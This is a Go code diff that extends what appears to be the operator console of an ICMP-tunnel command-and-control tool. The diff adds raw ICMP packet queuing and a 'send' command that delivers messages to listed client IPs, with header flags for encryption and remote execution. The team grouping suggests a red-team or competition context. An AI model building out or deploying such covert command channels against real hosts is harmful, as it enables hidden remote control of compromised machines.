@@ -3,6 +3,7 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"net"
 	"os"
 	"strconv"
 	"strings"
@@ -12,9 +13,11 @@ import (
 )
 
 var clients = make(map[int]string)
+var PacketQueue []icmp.Message
 var SSM bool = true
 var execute = false
 var ID int = 0
+var c, ListenerError = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
 
 func print_title() {
 	fmt.Println(".__                          ___             .__.__    ___")
@@ -64,8 +67,8 @@ func LoadClients() {
 	}
 }
 
-func generate_header(segment int, segmented bool) string {
-	segHeader := strconv.Itoa(segment)
+func GenerateHeader(segment int, segmented bool, ip string) string {
+	SegmentNum := strconv.Itoa(segment)
 	header := "!!!"
 	// ### is server flag, value 1 (SSM) is Encryption option, 2 is execution option
 	// 3 is segment for oversized packets, 4 is segment ID
@@ -84,11 +87,12 @@ func generate_header(segment int, segmented bool) string {
 	} else {
 		header += "0"
 	}
-	header += segHeader
+	header += SegmentNum
+	header += "[" + ip + "]"
 	return header
 }
 
-func MakePacket(payload string) icmp.Message {
+func MakePacket(payload string) {
 	packet := icmp.Message{
 		Type: ipv4.ICMPTypeEcho,
 		Code: 0,
@@ -98,22 +102,60 @@ func MakePacket(payload string) icmp.Message {
 			Data: []byte(payload),
 		},
 	}
-	return packet
+	PacketQueue = append(PacketQueue, packet)
 }
 
-func SendPacket(packet icmp.Message) {
+func SendPackets(addr string, c icmp.PacketConn) {
+	for _, packet := range PacketQueue {
+		// fmt.Println("Packet:", addr)
+		binaryEncoding, _ := packet.Marshal(nil)
+		dst, _ := net.ResolveIPAddr("ip4", addr)
+		anInt, err := c.WriteTo(binaryEncoding, dst)
 
+		if err != nil {
+			fmt.Println("I FAILED DOG")
+		} else if anInt != len(binaryEncoding) {
+			fmt.Println("YOU FELL OFF")
+		}
+	}
+}
+
+func Send(message string, id int) {
+	if len(message) > 1460 {
+		// Handle large payloads
+	} else {
+		header := GenerateHeader(0, false, clients[id])
+		payload := header + message
+		MakePacket(payload)
+		SendPackets(clients[id], *c)
+	}
+
+	fmt.Println("[DEBUG]", message, "sent to client", id, "at", clients[id])
 }
 
 func CheckTwoStrings(words []string) bool {
-	if len(words) != 2 {
-		fmt.Println("Invalid input")
+	if len(words) == 1 {
+		fmt.Println("Usage: add <IP Address>")
+		return false
+	}
+	words = strings.Split(words[1], " ")
+	if len(words) != 1 {
+		fmt.Println("Usage: add <IP Address>")
 		return false
 	}
 	return true
 }
 
+func ParseID(args []string) (string, int) {
+	ParsedArgs := strings.SplitN(args[1], " ", 2)
+	id, _ := strconv.Atoi(ParsedArgs[0])
+	return ParsedArgs[1], id
+}
+
 func main() {
+	if ListenerError != nil {
+		fmt.Println(ListenerError)
+	}
 	print_title()
 	for {
 		consoleReader := bufio.NewReader(os.Stdin)
@@ -123,7 +165,7 @@ func main() {
 		if err != nil {
 			fmt.Println(err)
 		}
-		tokens := strings.Split(input, " ")
+		tokens := strings.SplitN(input, " ", 2)
 
 		switch tokens[0] {
 		case "add":
@@ -145,6 +187,9 @@ func main() {
 			ShowClients()
 		case "load":
 			LoadClients()
+		case "send":
+			message, id := ParseID(tokens)
+			Send(message, id)
 		case "kill":
 			print_title()
 			os.Exit(0)
@@ -153,3 +198,16 @@ func main() {
 		}
 	}
 }
+
+// For later dont even look
+// func DisplayHosts(hosts []string, numTeams int) {
+// 	hostsPerTeam := len(hosts) / numTeams
+// 	teams := make([]string, numTeams)
+// 	for i, host := range hosts {
+// 		team := i / hostsPerTeam
+// 		teams[team] += host + " "
+// 	}
+// 	for _, team := range teams {
+// 		fmt.Println(team)
+// 	}
+// }
